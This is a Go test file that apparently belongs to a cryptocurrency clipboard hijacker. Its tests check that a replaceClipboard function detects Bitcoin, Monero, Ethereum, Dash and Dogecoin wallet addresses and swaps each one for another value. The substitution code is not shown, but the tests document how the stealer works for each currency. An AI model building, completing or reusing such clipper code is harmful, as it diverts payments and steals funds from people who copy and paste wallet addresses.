package main

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestBitcoinMatch(t *testing.T) {
	var bitcoinExample string = "bc1qp3f7vnmuj4pjxpfvkvf7yznac9h9r5arlv4fpv"
	var expected string = "new"

	actual, err := replaceClipboard(bitcoinExample)

	assert.Equal(t, actual, expected)
	assert.Equal(t, err, nil)
}

func TestMoneroMatch(t *testing.T) {
	var moneroExample string = "4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge"
	var expected string = "new"

	actual, err := replaceClipboard(moneroExample)

	assert.Equal(t, expected, actual)
	assert.Equal(t, err, nil)
}

func TestEthereumMatch(t *testing.T) {
	var ethExample string = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F"
	var expected string = "new"

	actual, err := replaceClipboard(ethExample)

	assert.Equal(t, actual, expected)
	assert.Equal(t, err, nil)
}

func TestDashMatch(t *testing.T) {
	var dashExample string = "XpESxaUmonkq8RaLLp46Brx2K39ggQe226"
	var expected string = "new"

	actual, err := replaceClipboard(dashExample)

	assert.Equal(t, expected, actual)
	assert.Equal(t, err, nil)
}

func TestDogeMatch(t *testing.T) {
	var dogeExample string = "DMuFDCTwxdqzfWrCEE7HiMxBonKVU49Fz4"
	var expected string = "new"

	actual, err := replaceClipboard(dogeExample)

	assert.Equal(t, expected, actual)
	assert.Equal(t, err, nil)
}
